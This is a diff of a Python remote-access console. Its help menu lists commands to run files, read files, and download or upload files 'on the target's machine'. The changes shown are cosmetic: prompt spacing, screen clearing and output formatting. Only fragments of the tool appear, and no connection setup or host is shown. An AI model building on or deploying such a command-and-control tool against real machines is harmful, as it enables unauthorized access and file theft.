@@ -22,7 +22,7 @@ def help():
 | [1]  whoami        It Shows You The Computer And User Name.                                    |
 | [2]  cd            Change The Directory.                                                       |
 | [3]  dir           Display Any Files Inside The Directory.                                     |
-| [4]  cat           Display File's Content (Read The File).                                     |
+| [4]  cat filename  Display File's Content (Read The File).                                     |
 | [5]  start         Run A File On The Target's Machine.                                         |
 | [6]  download      Download Any File From The Target (*Note This Will Not Work With Pictures). |
 | [7]  upload        Upload Any File To The Target     (*Note This Will Not Work With Pictures). |
@@ -51,7 +51,9 @@ def execute():
 
             while True:
 
-                cmd = input('[Run A Command]: ')
+                cmd = input('\n[Run A Command]: ')
+
+                print('\n')
 
                 if cmd =='exit':
 
@@ -67,15 +69,11 @@ def execute():
 
                 elif cmd == 'cls':
 
-                    try:
-
+                    if 'Windows' in platform.platform():
                         os.system('cls')
-
-                        os.system('clear')
-
                         continue
-
-                    except:
+                    else:
+                        os.system('clear')
                         continue
                 
                 elif cmd == 'download':
@@ -133,7 +131,7 @@ def execute():
 
                     data = object.recv(2048).decode('ascii')
 
-                    print('\n',data,'\n')
+                    print(data,'\n')
 
                     continue
 
@@ -189,7 +187,7 @@ def execute():
 
                     data = object.recv(2048).decode('ascii')
 
-                    print(f"\n{data}\n")
+                    print(f"{data}\n")
 
 if __name__=='__main__':
 
